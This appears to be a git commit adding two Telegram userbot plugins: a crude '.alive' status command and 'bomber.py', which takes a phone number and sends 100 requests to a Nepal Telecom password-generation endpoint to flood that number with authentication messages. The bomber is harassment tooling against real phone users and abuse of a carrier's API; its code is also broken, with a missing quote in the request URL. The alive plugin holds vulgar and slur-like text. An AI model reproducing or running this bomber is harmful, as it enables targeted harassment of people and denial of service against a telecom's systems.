cc2cac0e93b490de5f95af1762ab969374985084
scifidemon <sovitlekhak@gmail.com>
2020-03-22 21:29:31 +0545

    commit on 'master'

---
+++ userbot/plugins/alive.py
@@ -0,0 +1,17 @@
+"""Check if userbot alive."""
+import asyncio
+from telethon import events
+from telethon.tl.types import ChannelParticipantsAdmins
+from platform import uname
+from userbot import ALIVE_NAME
+from userbot.utils import admin_cmd
+
+DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "No name set yet... puk you"
+
+@command(outgoing=True, pattern="^.alive$")
+async def amireallyalive(alive):
+    """ For .alive command, check if the bot is running.  """
+    await alive.edit("Corona hasn't killed me yet.\n\n"
+                     "Telethon version: 6.9.0\nPython: 3.7.3\n"
+                     "Database Status: Databases functioning normally!(unless you run out of dynos)\n`"
+                     f"This nibba kanged me: {DEFAULTUSER}\n")
---
+++ userbot/plugins/bomber.py
@@ -0,0 +1,20 @@
+"""NTC Bomber custom plugin by @scifidemon
+Format .bomb [phone number]"""
+import asyncio
+import requests
+from userbot.utils import admin_cmd
+@borg.on(admin_cmd("bomb (.*)"))
+async def _(event):
+    num=0
+    n=100
+    input_str = event.pattern_match.group(1)
+    if input_str:
+        num = int(input_str)
+    else:
+        await event.edit("Enter a number!")
+        return
+    paramss={"phone":num}
+    for i in range (n):
+        requests.post(https://cms.ntc.net.np/api/generateAuthPassword",params=paramss)
+
+
